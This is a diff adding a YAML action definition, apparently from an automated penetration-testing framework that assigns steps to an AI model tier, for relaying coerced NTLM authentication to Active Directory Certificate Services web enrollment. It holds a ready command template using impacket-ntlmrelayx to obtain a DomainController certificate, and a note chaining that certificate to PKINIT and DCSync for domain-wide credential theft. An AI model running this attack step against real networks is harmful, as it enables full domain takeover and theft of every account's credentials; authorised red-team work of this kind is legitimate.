@@ -1,0 +1,16 @@
+name: adcs_relay
+category: services
+description: ADCS web enrollment relay
+preconditions:
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-ntlmrelayx -t http://{ca_ip}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Relay coerced NTLM auth to ADCS web enrollment. Obtain cert as relayed principal. If DC cert obtained → PKINIT → DCSync. Requires web enrollment role."
